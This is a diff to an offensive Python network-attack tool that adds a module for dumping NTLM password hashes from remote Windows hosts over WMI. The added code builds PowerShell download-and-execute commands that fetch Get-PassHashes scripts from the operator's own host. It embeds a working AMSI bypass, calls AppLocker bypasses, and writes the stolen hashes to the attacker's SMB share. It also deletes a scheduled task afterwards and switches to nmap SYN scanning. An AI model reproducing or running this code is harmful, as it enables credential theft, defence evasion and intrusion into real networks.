@@ -2090,9 +2090,9 @@ def testAccount(targetIP, domain, username, password, passwordHash):
             return False        
         else:
             if len(domain)>0:
-                print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" [OK][Admin]"            
+                print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" "+(setColor("[OK][ADMIN]", bold, color="green"))
             else:
-                print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+username+":"+password+" [OK][Admin]"            
+                print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+username+":"+password+" "+(setColor("[OK][ADMIN]", bold, color="green"))
             return True
 
 def testAccountSilent(targetIP, domain, username, password, passwordHash):
@@ -2242,6 +2242,117 @@ def updateMimiStaging(targetIP,domain,username,password,passwordHash):
             tmpPassword=x[2]
             print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+(setColor("[mimikatz]", color="green"))+" | "+tmpDomain+"\\"+tmpUsername+":"+tmpPassword+(setColor(" [Found] ", bold, color="green"))                
         return tmpPasswordList
+
+def runHashes(targetIP,domain,username,password,passwordHash):
+    tmpPasswordList1=[]
+    tmpPasswordList=[]
+    results=''
+    if testAccountSilent(targetIP, domain, username, password, passwordHash)==True:
+        if domain==None or len(domain)<1:
+            domain='WORKGROUP'
+        command='systeminfo | findstr /B /C:"OS Name"'
+        results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash,command) 
+        if "Microsoft Windows 10" in str(results):
+            tmpPasswordList=updateMimiStaging(targetIP,domain,username,password,passwordHash)
+        else:
+            psAvailStatus=testPowershell(targetIP, domain, username, password, passwordHash)
+            if psAvailStatus==True:
+                powershellPath=getPowershellPath(targetIP,domain,username,password,passwordHash)
+                if obfuscatedMode==False:  
+                    if amsiMode==True:
+                        if password==None:
+                            print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+passwordHash+" | "+(setColor("[amsi][hashes] ", bold, color="green"))+"Dumping Hashes"
+                        else:
+                            print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" | "+(setColor("[amsi][hashes] ", bold, color="green"))+"Dumping Hashes"
+                        tmpCmd='reg query "HKLM\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v2.0.50727" /v Version'
+                        results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash,tmpCmd)
+                        if '2.0.50727.4927' in results:
+                            command=powershellPath+" -Version 2 "+powershellArgs+" IEX \"(New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Get-PassHashes.ps1\'); Get-PassHashes\""  
+                        else:
+                            amsiBypassStr="[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)"
+                            command=powershellPath+" "+powershellArgs+"-Command "+amsiBypassStr+"; IEX \"(New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Get-PassHashes.ps1\'); Get-PassHashes\""  
+                    else:           
+                        if password==None:
+                            print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+passwordHash+" | "+(setColor("[hashes] ", bold, color="green"))+"Dumping Hashes"        
+                        else:
+                            print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" | "+(setColor("[hashes] ", bold, color="green"))+"Dumping Hashes"        
+                        command=powershellPath+" "+powershellArgs+" IEX \"(New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Get-PassHashes.ps1\'); Get-PassHashes\""                                          
+                else:
+                    if amsiMode==True:
+                        if password==None:
+                            print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+passwordHash+" | "+(setColor("[amsi][obfs][hashes] ", bold, color="green"))+"Dumping Hashes"
+                        else:
+                            print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" | "+(setColor("[amsi][obfs][hashes] ", bold, color="green"))+"Dumping Hashes"
+                        tmpCmd='reg query "HKLM\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v2.0.50727" /v Version'
+                        results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash,tmpCmd)
+                        if '2.0.50727.4927' in results:
+                            command=powershellPath+" -Version 2 "+powershellArgs+" IEX \"(New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Get-PassHashes-obfs.ps1\'); Get-PassHashes\""  
+                        else:
+                            amsiBypassStr="[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)"
+                            command=powershellPath+" "+powershellArgs+"-Command "+amsiBypassStr+"; IEX \"(New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Get-PassHashes-obfs.ps1\'); Get-PassHashes\""  
+                    else:
+                        print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" | "+(setColor("[obfs][hashes] ", bold, color="green"))+"Dumping Hashes"
+                        command=powershellPath+" "+powershellArgs+" IEX \"(New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Get-PassHashes-obfs.ps1\'); Get-PassHashes\""  
+                if debugMode==True:
+                    print command
+                results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash,command) 
+                if "doesn't match OS architecture." in str(results):
+                    command=command.replace("\\SysWOW64\\","\\System32\\")
+                    results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash,command) 
+                temp_name = (next(tempfile._get_candidate_names()))+".txt"
+                f = open('/tmp/'+temp_name, 'w')
+                f.write(results) 
+                f.close()
+                tmpData = [line.strip() for line in open('/tmp/'+temp_name, 'r')]
+                if "This script contains malicious content and has been blocked by your antivirus" in str(tmpData):
+                    print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" | "+(setColor("[amsi] ", bold, color="green"))+" Blocked by AMSI"
+                else:
+                    print results
+
+            else:        
+                if obfuscatedMode==False:           
+                    cmd=" IEX (New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Get-PassHashes.ps1\'); Get-PassHashes"
+                else:
+                    print (setColor("[*]", bold, color="blue"))+" "+targetIP+":445 | "+(setColor("[hashes][obfs]", color="green"))+" | Enable Powershell Obfuscation"
+                    cmd=" IEX (New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Get-PassHashes-obfs.ps1\'); Get-PassHashes | Out-File \\\\"+myIP+"\\guest\\"+targetIP+"_hashes.txt"    
+
+                if applockerBypass==True:
+                    newCmd=''
+                    randomCount=(randint(1, 2))
+                    if randomCount==1:
+                        newCmd=appLockerBypass2(targetIP, domain, username, password, passwordHash,cmd)
+                    if randomCount==2:
+                        newCmd=appLockerBypass3(targetIP, domain, username, password, passwordHash,cmd)
+                    if randomCount==3:
+                        newCmd=appLockerBypass4(targetIP, domain, username, password, passwordHash,cmd)
+                    if debugMode==True:                        
+                        print newCmd
+
+                    runWMIEXEC(targetIP, domain, username, password, passwordHash, newCmd) 
+                    tmpFilename=targetIP+"_hashes.txt" 
+                    foundFile=False
+                    resultsMimikatz=""
+                    while foundFile==False:
+                        tmpFilename1=origScriptPath+"/loot/"+tmpFilename
+                        if os.path.exists(tmpFilename1) and (os.stat(tmpFilename1).st_size != 0):
+                            tmpFilename2=convertWinToLinux(tmpFilename1)
+                            with open(tmpFilename2, 'r') as content_file:
+                                resultsMimikatz = content_file.read()
+                                foundFile=True
+                        else:
+                            time.sleep(2)
+                    cmd ='schtasks /query  /tn "microsoftschedulertest"'
+                    results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash,cmd) 
+                    if "Ready" in results:
+                        cmd ='schtasks /Delete /TN microsoftschedulertest /f'
+                        runWMIEXEC(targetIP, domain, username, password, passwordHash,cmd) 
+                    print resultsMimikatz
+        for x in tmpPasswordList:
+            tmpDomain=(x[0]).lower()
+            tmpUsername=(x[1]).lower()
+            tmpPassword=(x[2])
+            tmpPasswordList1.append([targetIP,tmpDomain,tmpUsername,tmpPassword])
+    return tmpPasswordList1
 
 def runMimikatz(targetIP,domain,username,password,passwordHash):
     tmpPasswordList1=[]
@@ -4393,6 +4504,7 @@ if len(sys.argv) == 1:
 args = parser.parse_args()
 if args.list_modules:
     tmpResultList=[]
+    tmpResultList.append(['hashes','Dump NTLM hashes'])
     tmpResultList.append(['pan','Dump and search PAN numbers from disks and memory'])
     tmpResultList.append(['shares','Find the correct account credentials to access shares/folders'])
     tmpResultList.append(['files','Find interesting files (UltraVNC, Unattend.xml, KeePass Files, Web.config, Filezilla, *passwords* docs)'])
@@ -4449,14 +4561,20 @@ if os.path.exists("secrets.sam"):
 
 inputStr=args.target[0]
 if "/" in inputStr:
+    ipList.append(inputStr)
+    '''
     for x in IPNetwork(inputStr):
         if str(x) not in ipList:
             if str(x) not in ipList: 
                 ipList.append(str(x))
+    '''
 else:
     if os.path.exists(inputStr):
         with open(inputStr) as f:
             lines = f.read().splitlines()
+            for x in lines:
+                ipList.append(x)
+            '''
             for x in lines:
                 if "/" in x:
                     for y in IPNetwork(x):
@@ -4466,6 +4584,7 @@ else:
                 else:
                     if x not in ipList:
                         ipList.append(x)
+            '''
     else:
         ipList.append(inputStr)
 
@@ -4485,6 +4604,7 @@ portList.append("389")
 portList.append("445")
 portList.append("1433")
 portList.append("3389")
+liveList=[]
 
 ipListStr=", ".join(ipList)
 print (setColor("[*]", bold, color="green"))+" Scanning Target Network"
@@ -4495,13 +4615,23 @@ os.chdir(web_dir)
 threading.Thread(target=my_tcp_server).start()
 
 #updateMimiStaging()
-
+'''
 import resource
 resource.setrlimit(resource.RLIMIT_NOFILE, (1024, 3000))
 screenLock = threading.Semaphore(value=3)
 for port in portList:
     for x in ipList:
         scanThread(x, port)
+'''
+nm = nmap.PortScanner()
+for z in portList:
+    for x in ipList:
+        nm.scan(x,str(z),arguments='-Pn -T4 -sS -n --open --max-rtt-timeout=950ms --max-retries=3 --min-hostgroup=51 --min-parallelism=70 --max-parallelism=150')
+        tmpHostList=nm.all_hosts()
+        for y in tmpHostList:
+            y=y.strip()
+            if y not in liveList:
+                liveList.append([y,z])
 for x in liveList:
     hostNo=x[0]
     portNo=x[1]
@@ -4515,13 +4645,14 @@ for x in liveList:
     if portNo=='445':
         if hostNo not in dcList:
             if hostNo!=myIP:
-		hostNo=hostNo.strip()
+                hostNo=hostNo.strip()
                 nbList.append(hostNo)
     if portNo=='389':
 	hostNo=hostNo.strip()
         dcList.append(hostNo)
         if hostNo in nbList:
             nbList.remove(hostNo)
+
 if len(dcList)<1 and len(rdpList)<1 and len(nbList)<1:
     print "[+] No Domain Controllers/NetBIOS/RDP ports detected on target hosts"
     os._exit(0)
@@ -4538,7 +4669,7 @@ else:
         print x+" [RDP]"        
     for x in mssqlList:
         print x+" [MSSQL]"        
-    print "\n"
+print "\n"
 
 isDomainAccount=False
 logging.getLogger().setLevel(logging.ERROR)
@@ -5485,6 +5616,23 @@ if args.module=='mimikatz':
                 password=x[3]
                 passwordHash=None
             runMimikatz(ip,domain,username,password,passwordHash)
+    os._exit(1)
+
+if args.module=='hashes':
+    tmpResultList=[]
+    tmpDoneList=[]
+    for x in accessAdmHostList:
+        if x[0] not in tmpDoneList:
+            ip=x[0]
+            domain=x[1]
+            username=x[2]
+            if len(x[3])==65 and x[3].count(":")==1:
+                passwordHash=x[3]
+                password=None
+            else:
+                password=x[3]
+                passwordHash=None
+            runHashes(ip,domain,username,password,passwordHash)
     os._exit(1)
 
 if args.module=='tokens':
